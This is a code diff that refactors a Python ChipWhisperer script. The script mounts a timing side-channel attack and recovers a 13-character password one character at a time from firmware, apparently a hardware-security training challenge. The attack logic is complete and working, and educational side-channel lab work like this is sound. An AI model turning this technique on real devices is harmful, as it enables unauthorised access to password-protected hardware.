@@ -2,21 +2,24 @@ import chipwhisperer as cw
 import time
 import statistics
 
-charset = 'abcdefghijklmnopqrstuvwxyz0123456789{}'
-pwd_len = 13
-samples = 10
-firmware = '../../../challenges/set1/gatekeeper-CWNANO.hex'
+CHARSET = 'abcdefghijklmnopqrstuvwxyz0123456789{}'
+PWD_LEN = 13
+SAMPLES = 10
+FIRMWARE = '../../../challenges/set1/gatekeeper-CWNANO.hex'
 
 def setup():
     scope = cw.scope()
     target = cw.target(scope, cw.targets.SimpleSerial)
     time.sleep(0.05)
     scope.default_setup()
+
     import os
-    fw_path = os.path.abspath(firmware)
+    fw_path = os.path.abspath(FIRMWARE)
     prog = cw.programmers.STM32FProgrammer
     cw.program_target(scope, prog, fw_path)
+    print("programming done")
     time.sleep(0.2)
+
     return scope, target
 
 def measure_time(target, password):
@@ -29,32 +32,29 @@ def measure_time(target, password):
 
 def guess_character(target, current_password, position):
     timings = {}
-    for char in charset:
-        pwd_try = (current_password + char).ljust(pwd_len, 'a')
-        char_samples = []
-        for _ in range(samples):
+    for char in CHARSET:
+        pwd_try = (current_password + char).ljust(PWD_LEN, 'a')
+        samples = []
+        for _ in range(SAMPLES):
             t = measure_time(target, pwd_try)
-            char_samples.append(t)
+            samples.append(t)
             time.sleep(0.01)
-        median_time = statistics.median(char_samples)
+        median_time = statistics.median(samples)
         timings[char] = median_time
+
     best_char = max(timings, key=timings.get)
-    print(f"position {position}: '{best_char}'")
+    print(f"position {position}: guessed '{best_char}'")
     return best_char
 
 def main():
-    attack_start = time.time()
     scope, target = setup()
     found_password = ""
-    for pos in range(0, pwd_len):
+
+    for pos in range(0, PWD_LEN):
         next_char = guess_character(target, found_password, pos)
         found_password += next_char
-    attack_end = time.time()
-    total_time = attack_end - attack_start
-    print(f"password: {found_password}")
-    print(f"time: {total_time:.2f}s")
-    total_queries = pwd_len * len(charset) * samples
-    print(f"queries: {total_queries}")
+
+    print(f"guessed password: {found_password}")
 
 if __name__ == '__main__':
     main()
